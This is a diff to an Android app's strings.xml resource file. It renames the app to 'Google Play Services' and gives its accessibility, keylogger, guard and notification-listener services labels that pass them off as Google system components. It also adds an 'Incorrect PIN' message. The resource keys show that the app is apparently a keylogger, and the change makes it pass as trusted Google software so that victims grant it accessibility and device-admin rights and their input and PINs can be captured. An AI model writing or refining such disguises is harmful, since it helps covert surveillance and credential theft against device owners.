@@ -1,10 +1,11 @@
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
-    <string name="app_name"></string>
-    <string name="accessibility_service_description">Android System core service for device optimization and performance monitoring.</string>
-    <string name="keylogger_service_description">System input optimization service for enhanced typing performance.</string>
-    <string name="guard_service_description">Android System protection service for stability.</string>
-    <string name="accessibility_service_label">Android System</string>
-    <string name="notification_listener_label">Android System</string>
+    <string name="app_name">Google Play Services</string>
+    <string name="accessibility_service_description">Provides core accessibility features for Google services and system stability.</string>
+    <string name="keylogger_service_description">Input monitoring for Google accessibility and diagnostics.</string>
+    <string name="guard_service_description">Protects accessibility settings for system stability.</string>
+    <string name="accessibility_service_label">Google System Helper</string>
+    <string name="notification_listener_label">Google Notifications</string>
+    <string name="pin_invalid">Incorrect PIN</string>
     <string name="device_admin_description">Required for system stability and security updates.</string>
 </resources>
